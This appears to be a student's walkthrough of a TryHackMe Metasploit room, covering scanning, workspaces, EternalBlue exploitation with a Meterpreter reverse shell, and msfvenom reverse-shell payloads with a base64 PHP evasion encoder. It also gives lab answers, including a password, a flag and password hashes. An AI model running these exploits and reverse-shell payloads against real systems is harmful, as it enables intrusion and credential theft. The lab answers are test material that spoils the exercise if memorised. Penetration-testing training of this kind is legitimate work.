# ‚úÖ **Metasploit_Exploitation.md**

---

# **Metasploit: Exploitation**

> Using Metasploit for scanning, vulnerability assessment, and exploitation.

---

# **Tasks**

* Task 1 ‚Äî Introduction
* Task 2 ‚Äî Scanning
* Task 3 ‚Äî The Metasploit Database
* Task 4 ‚Äî Vulnerability Scanning
* Task 5 ‚Äî Exploitation
* Task 6 ‚Äî Msfvenom
* Task 7 ‚Äî Summary

---

# üß© **Task 1 ‚Äî Introduction**

This room teaches how to use the **Metasploit Framework** for:

* Scanning targets
* Organizing engagement data through the Metasploit database
* Performing vulnerability scans
* Exploiting vulnerable services
* Generating payloads using **msfvenom**
* Establishing **Meterpreter** sessions

These are essential skills for penetration testing, red teaming, and practical exploitation workflows.

---

### üìå Wordlist Location

Any brute-force tasks in this room require the AttackBox wordlist at:

```
/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
```

---

### üöÄ Starting Metasploit

```
msfconsole
```

**Explanation:**
This launches the Metasploit console.
It is the main interface for:

* Searching modules
* Setting module options
* Running scanners/exploits
* Managing sessions
* Running Nmap
* Using msfvenom handlers

---

### ‚úîÔ∏è Answer

No answer needed.

---

# üß≠ **Task 2 ‚Äî Scanning**

Scanning is the first phase of exploitation.
Metasploit provides **port scanners**, **protocol scanners**, and **service fingerprinting modules**.

---

## üîé Searching for Scanner Modules

```
search portscan
```

**Explanation:**
The `search` command queries Metasploit‚Äôs entire module library by keyword.
You can search for modules based on:

* Protocol (`http`, `ftp`, `smb`)
* Vulnerability (`ms17-010`)
* Author (`todb`)
* Module type (`auxiliary`, `exploit`, `post`)
* OS (`windows`, `linux`)
* CVE numbers (`cve:2017`)

---

## üß™ Using a Port Scan Module

Example:

```
use auxiliary/scanner/portscan/tcp
```

### Show module options:

```
show options
```

**Explanation:**
This command lists all required and optional parameters for the module.
Typical scanning options include:

| Option          | Meaning                        |
| --------------- | ------------------------------ |
| **RHOSTS**      | Target IP(s) or range          |
| **PORTS**       | Which ports to scan            |
| **CONCURRENCY** | How many probes to run at once |
| **THREADS**     | Worker threads                 |
| **TIMEOUT**     | Socket timeout                 |

Metasploit scanners behave similarly to Nmap but are slower and more precise for specific protocols.

---

## ‚ö° Running Nmap Inside Metasploit

```
nmap -sS 10.10.12.229
```

**Explanation:**
This allows running Nmap from inside `msfconsole`.
Advantages:

* Results appear inside your console
* You don‚Äôt need to leave Metasploit
* Combined with the database feature, results are auto-stored

---

## üîä UDP Discovery Scan

```
use auxiliary/scanner/discovery/udp_sweep
run
```

**Explanation:**
This scanner sends UDP probes to detect services such as:

* NetBIOS
* SNMP
* mDNS
* NTP
* Syslog

UDP services often reveal critical info without authentication.

---

## üñ•Ô∏è SMB Version Scan

```
use auxiliary/scanner/smb/smb_version
run
```

**Explanation:**
This identifies:

* Windows version
* SMB version
* Architecture
* Potential vulnerabilities (SMBv1, EternalBlue, etc.)

This is essential for Windows exploitation.

---

## ‚úîÔ∏è Task Answers

* **How many ports are open?** ‚Üí `5`
* **NetBIOS name?** ‚Üí `ACME IT SUPPORT`
* **What‚Äôs running on port 8000?** ‚Üí `webfs/1.21`
* **Password for SMB user penny?** ‚Üí `leo1234`

---

# üóÑÔ∏è **Task 3 ‚Äî The Metasploit Database**

The Metasploit database simplifies large engagements by storing:

* Hosts
* Ports
* Services
* Notes
* Credentials
* Vulnerabilities
* Loot
* Workspaces

It uses PostgreSQL as its backend.

---

## ‚ñ∂Ô∏è Check Database Connection

```
db_status
```

**Explanation:**
Shows whether Metasploit is connected to PostgreSQL.
If not connected, scanning and host tracking will not work.

---

## üóÇÔ∏è Workspaces

Workspaces let you separate different engagements.

List available workspaces:

```
workspace
```

Add a new workspace:

```
workspace -a tryhackme
```

Switch:

```
workspace tryhackme
```

**Explanation:**
Each workspace maintains its own hosts, services, vulns, etc.
This is essential for multi-target assessments.

---

## üõ∞Ô∏è Using db_nmap

```
db_nmap -sV -p- 10.10.12.229
```

**Explanation:**
Runs Nmap but also **stores all results directly into the database**:

* Host IP
* Ports
* Service banners
* Versions
* OS clues

This is one of the best ways to combine Nmap with Metasploit.

---

## üîç Querying the Database

List hosts:

```
hosts
```

List services:

```
services
```

Filter services:

```
services -S netbios
```

Load hosts into a module automatically:

```
hosts -R
```

**Explanation:**
This loads the host list directly into the `RHOSTS` value ‚Äî excellent for multiple-target scanning.

---

# üïµÔ∏è‚Äç‚ôÇÔ∏è **Task 4 ‚Äî Vulnerability Scanning**

Metasploit includes vulnerability scanners for:

* SMB
* SSH
* FTP
* VNC
* HTTP
* SMTP
* Database services
* Custom protocol vulnerabilities

---

## üîç Example: VNC Scanner

```
use auxiliary/scanner/vnc/vnc_login
```

**Explanation:**
Attempts authentication to VNC services using:

* Username lists
* Password lists
* Blank password checks

Useful for low-security Windows or IoT devices.

---

## üß† Module Info

```
info
```

**Explanation:**
Displays detailed information including:

* Description
* Authors
* Data requirements
* References (CVE links)
* Default target OS
* Expected behavior

You should always run `info` before using a module.

---

## ‚úîÔ∏è Answer

**Who wrote the module to check SMTP open relay?**
‚Üí `Campbell Murray`

---


# üß® **Task 5 ‚Äî Exploitation**

This task walks through using Metasploit to exploit a real vulnerability (MS17-010 / EternalBlue) and gain a shell on the target.

---

## üîé Searching for Exploits

```bash
search ms17_010
```

**Explanation:**
The `search` command looks through all Metasploit modules for the keyword you specify. Here, we search for ‚Äúms17_010‚Äù to locate:

* Scanners (`auxiliary/scanner/...`)
* Exploits (`exploit/windows/smb/...`)
* Related post-exploitation modules

You can also search by CVE (`search cve:2017-0143`), by service (`search smb`), or by platform (`search type:exploit windows`).

---

## üéØ Selecting the Exploit Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

**Explanation:**
`use` loads the specified module and drops you into its context.
Your prompt changes from:

```text
msf6 >
```

to:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Now, commands like `show options`, `set`, `exploit`, and `run` apply specifically to this module.

---

## üì¶ Viewing Available Payloads

```bash
show payloads
```

**Explanation:**
Every exploit can be paired with one of many payloads. `show payloads` lists all payloads that are **compatible** with the currently selected exploit.

Examples you might see:

* `generic/shell_reverse_tcp` ‚Äì simple reverse shell
* `windows/x64/meterpreter/reverse_tcp` ‚Äì full Meterpreter reverse shell
* `windows/x64/exec` ‚Äì run a specific command on the target

You‚Äôll pick one based on what you want to do after exploitation.

---

## üéõÔ∏è Setting a Payload

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

**Explanation:**
This tells Metasploit that once the EternalBlue exploit succeeds, it should establish a **Meterpreter** session back to your machine.

Meterpreter is preferred because it supports:

* File uploads/downloads
* Privilege escalation
* Pivoting
* Keylogging
* Post-exploitation modules

---

## üåê Setting Network Options

```bash
set LHOST 10.10.186.44
set LPORT 4444
```

**Explanation:**

* **LHOST** ‚Äì Your attack machine‚Äôs IP (where the victim will connect back).
* **LPORT** ‚Äì The listening port you‚Äôll use to receive the reverse connection.

These must be reachable from the target and match any firewall / NAT rules.

---

## üí• Launching the Exploit

```bash
exploit
```

**Explanation:**
Runs the exploit with the options you‚Äôve set. For EternalBlue, this includes:

* Grooming heap memory
* Triggering a buffer overflow in SMBv1
* Overwriting function pointers
* Executing your payload in kernel context

On success you‚Äôll see something like:

```text
[*] Sending stage (200262 bytes) to 10.10.x.x
[*] Meterpreter session 1 opened
```

---

## üßµ Managing Sessions

List open sessions:

```bash
sessions
```

**Explanation:**
Shows session IDs, types, and which host they‚Äôre tied to. Useful when you have multiple shells / Meterpreter sessions at once.

Interact with a session:

```bash
sessions -i 1
```

Background a session:

```bash
background
```

or press **CTRL+Z** when inside a Meterpreter shell.

Session help:

```bash
sessions -h
```

**Explanation:**
Shows advanced features:

* Upgrading shells
* Killing sessions
* Script automation
* Routing through sessions

---

## ‚úîÔ∏è Task 5 Answers

* Flag from `C:\flag.txt` ‚Üí `THM-545555845`
* NTLM hash of user `pirate` ‚Üí `8ce9a3ebd1647fcc5e04025019f4b875`

---

# üõ†Ô∏è **Task 6 ‚Äî Msfvenom**

This task focuses on **Msfvenom**, Metasploit‚Äôs standalone payload generator.

---

## üåç What is Msfvenom?

Msfvenom will allow you to access **all payloads available in the Metasploit Framework** without having to be inside `msfconsole`.

Msfvenom allows you to:

* Create payloads for many **target systems**

  * Windows
  * Linux
  * macOS
  * Android
  * Apple (iOS / OSX)
* Output them in many different **formats**

  * `exe`, `dll`, `elf`, `asp`, `aspx`, `war`, `php`, `ps1`, `raw`, `shellcode`, etc.
* Apply **encoders** to adjust the way payloads look in memory or transit
* Use them with exploit modules **or** with a handler-only setup

---

## üìö Listing Available Payloads

```bash
msfvenom -l payloads
```

**Explanation:**
`-l payloads` tells msfvenom to **list all supported payloads**, along with:

* Payload name
* Architecture (x86/x64/etc.)
* Platform (windows, linux, php, android, etc.)
* A short description

This is your reference for finding the correct payload name to use in `-p`.

Example usage:

```bash
msfvenom -l payloads | grep php
msfvenom -l payloads | grep windows/x64/meterpreter
```

---

## üßæ Output Formats (`-f` and listing formats)

When generating payloads, the `-f` flag controls the **output format**.

Common ones:

* `-f exe` ‚Üí Windows PE executable
* `-f elf` ‚Üí Linux ELF binary
* `-f raw` ‚Üí raw shellcode / source snippet
* `-f asp`, `-f aspx`, `-f war`, `-f php`, `-f c`, `-f python`, etc.

You can list available formats with:

```bash
msfvenom -l formats
```

or depending on version:

```bash
msfvenom --list formats
```

**Explanation:**
This tells you all supported encoding/output formats for your payloads, so you can choose the one that fits your target‚Äôs environment.

---

## üîê Encoders (within Msfvenom)

Encoders transform how the payload **looks**, but not what it **does**.

* Historically used to **bypass signature-based AV**.
* Now mainly useful to:

  * Avoid bad characters in exploits (`\x00`, `\x0a`)
  * Pass through simple filters
  * Change how shellcode is represented

### ‚ö†Ô∏è Important caveat:

> Encoders alone will **not** reliably bypass modern AV/EDR.

You specify an encoder using `-e`.

---

### üß™ Example: Encoding a PHP Meterpreter Payload

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=4444 -f raw -e php/base64
```

**What each part does:**

* `-p php/meterpreter/reverse_tcp` ‚Üí PHP-based Meterpreter reverse shell
* `LHOST=... LPORT=...` ‚Üí Where the shell should connect back
* `-f raw` ‚Üí Output raw PHP code (no wrapper like exe/elf)
* `-e php/base64` ‚Üí Use the `php/base64` encoder so the payload is base64-encoded and then decoded at runtime

In PHP it might look like:

```php
<?php eval(base64_decode("...payload here...")); ?>
```

This can sometimes help evade basic content filters or formatting issues.

---

## ü™ù Handlers (Catching Payloads)

When you generate payloads with Msfvenom, you must **catch the connection** with a handler in Metasploit.

Use a handler:

```bash
use exploit/multi/handler
```

Set the same payload:

```bash
set payload php/meterpreter/reverse_tcp
```

Set listener details:

```bash
set LHOST 10.10.X.X
set LPORT 4444
```

Run the handler:

```bash
run
```

**Explanation:**

* The handler is like a dedicated listener waiting for your payload to call back.
* It must match the payload type, LHOST, and LPORT you set in msfvenom.

---

## üì¶ Generating Payloads in Different Formats

The lesson gives these examples:

### üêß Linux ELF Meterpreter

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```

### ü™ü Windows EXE Meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

### üåê PHP Meterpreter Reverse Shell

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

### üêç Python Reverse Shell

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

**Explanation:**

* You pick a payload compatible with the OS / environment.
* You choose the format (`-f`) that will actually execute there.
* You transfer the file to the target, execute it, and catch the connection with `multi/handler`.

---

## ‚úîÔ∏è Task 6 (Conceptual) Answers / Flow

The TryHackMe steps for Task 6 are roughly:

1. Generate a Meterpreter payload (e.g., ELF) with Msfvenom.
2. Transfer it to the target.
3. Set up a handler in Metasploit.
4. Execute the payload on the target.
5. Get your Meterpreter session.
6. Use post-exploitation modules to dump hashes.
7. Identify the other user‚Äôs hash.

The other user‚Äôs hash from the lesson (as seen in your screenshot) is:

```text
$6$Sy0NNIXwS5J2RWItHI89hwM5UxqVGKixdj94QFRm2Ynp9p9kvgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFBWxjGmQCTbep0
```

---

# üßπ **Task 7 ‚Äî Summary**

In this room you combined:

* **Scanning** (Metasploit scanners + Nmap via `db_nmap`)
* **Database features** (workspaces, hosts, services)
* **Vulnerability scanning** (auxiliary modules for things like SMB, VNC, SMTP)
* **Exploitation** (MS17-010 / EternalBlue example)
* **Session handling** (`sessions`, `sessions -i`, backgrounding)
* **Msfvenom** (payload generation for various targets)
* **Encoders** (how and when to use them properly)
* **Handlers** (exploit/multi/handler for payloads not tied to a specific exploit)

This gives you a practical, end-to-end Metasploit workflow:

1. Discover ‚Üí 2. Enumerate ‚Üí 3. Identify vulns ‚Üí 4. Exploit ‚Üí 5. Establish shell ‚Üí 6. Post-exploit ‚Üí 7. Loot / hashes / persistence.

**No questions required for Task 7.**

---
